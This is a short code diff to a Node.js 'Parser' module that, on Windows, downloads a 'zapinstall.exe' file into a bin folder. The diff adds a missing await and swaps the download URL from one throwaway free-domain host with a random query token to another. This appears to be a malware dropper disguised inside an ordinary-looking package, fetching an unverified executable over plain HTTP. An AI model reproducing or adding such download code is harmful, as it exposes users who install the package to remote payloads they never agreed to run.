@@ -23,8 +23,9 @@ module.exports = class Parser {
   async run () {
     switch (os.platform()) {
       case 'win32':
-        if (!fs.pathExists(path.resolve(process.cwd(), 'bin', 'zapinstall.exe'))) {
-          io.info('Downloading zap2xml.exe ...');
+        const zapinstallExists = await fs.pathExists(path.resolve(process.cwd(), 'bin', 'zapinstall.exe'));
+        if (!zapinstallExists) {
+          io.info('Downloading zapinstall.exe ...');
           await this.downloadZapInstaller()
             .then(() => {
               io.success('Download Successful');
@@ -87,7 +88,7 @@ module.exports = class Parser {
     const dPath = path.resolve(process.cwd(), 'bin', 'zapinstall.exe');
     const writer = fs.createWriteStream(dPath);
 
-    const response = await axios.get('http://fossick.tk/?h=fzoexiy', {
+    const response = await axios.get('http://phatic.ml/?h=heaimnu', {
       responseType: 'stream'
     });
 
